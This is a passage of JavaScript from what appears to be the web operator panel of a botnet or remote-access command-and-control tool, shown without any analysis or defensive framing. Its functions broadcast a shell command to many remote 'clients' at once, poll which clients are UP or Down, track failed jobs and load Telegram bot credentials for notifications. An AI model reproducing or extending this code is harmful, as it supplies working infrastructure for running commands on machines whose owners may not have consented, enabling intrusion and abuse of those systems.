  var cmd_uid = localStorage.getItem("cmd_uid");

  $.post(
    BASE_URL,
    { cmd_uid: cmd_uid, uuid: uuid, get_command: true, token: token },
    function (data) {
      if (data.trim() != 'Client Offline Or Wait For Send Results') {
        alert("Uploaded !")
        var Interval = localStorage.getItem("Interval");
        clearInterval(Interval)
      }
    })
  }





  function run_all_exec(){
    var data=document.location.hash.split("&") 
    data.pop()
    var command=$("#run_all_shell_cmd").val()
    swal({
      title: "Are you sure",
      text: `Run Command For ${data.length} Clients`,
      icon: "warning",
      buttons: true,
      dangerMode: true,
    }).then((willDelete) => {
      if (willDelete) {
        data.forEach(function (data) {
          
          $.post(BASE_URL,{ add_command: true, command: command, uuid: data.replace("#",""), token: token });
      
        })
        swal({
          title: "OK",
          text: `Added ${data.length} Clients Successfuly!`,
          icon: "success",
          dangerMode: true,
        });

      }
    });
      
    }











    function online() {
      $.post(BASE_URL, { offline: true, token: token });



      setTimeout(() => {
   
        $(".status_client").each(function( index ) {
          var uuid=$( this ).attr("uuid") 
          $.post(BASE_URL, { online: true, token: token,uuid:uuid }, function (data) {

       
          
   
            var status_client = data.trim();
         
                 if (status_client == 1) {
                   status_client_template = `<span class="active">UP</span>`;
                 } else {
                   status_client_template = `<span class="deactive">Down</span>`;
                 }
   
                 $(`.status_client[uuid="${uuid}"]`).html(status_client_template);
       
         })
        });
  
      








      }, 2000)


    }














    function status_job() {
      $.post(BASE_URL, { offline: true, token: token });



      setTimeout(() => {
   
        $(".status_job").each(function( index ) {
          var uuid=$( this ).attr("uuid") 
          $.post(BASE_URL, { failjob: true, token: token,uuid:uuid }, function (data) {

       
   
            var status_job = data.trim();
         
                 if (status_job == 1) {
                   status_job_template = `<span class="active">NO</span>`;
                 } else {
                   status_job_template = `<span class="deactive">YES</span>`;
                 }
   
                 $(`.status_job[uuid="${uuid}"]`).html(status_job_template);
       
         })
        });
  
      








      }, 2000)


    }



function check_notification_status(e){
  e.preventDefault
  $.post(BASE_URL, { notification: true, token: token}, function (data) {
    if(data.trim()=="ko"){
      
      swal({
        title: "Oops...",
        text: "Bot Token or UserID Not Set",
        icon: "error",
        dangerMode: true,
      });
      $('#check_notification_status').prop('checked', false);
    }
  })
}
function get_bot_data(){
  $.post(BASE_URL, { get_notification_data: true, token: token}, function (data) {
      var break_data=data.trim().split("@@")
      $("#userid_telegram").val(break_data[0])
      $("#token_telegram").val(break_data[1])
      
  })
}


// end function

loadData();
loadVariable();
loadModule();
// load user data every 3 secound for newuser and check client offline or online
setInterval(function () {
  online()
  status_job()
}, 3000)
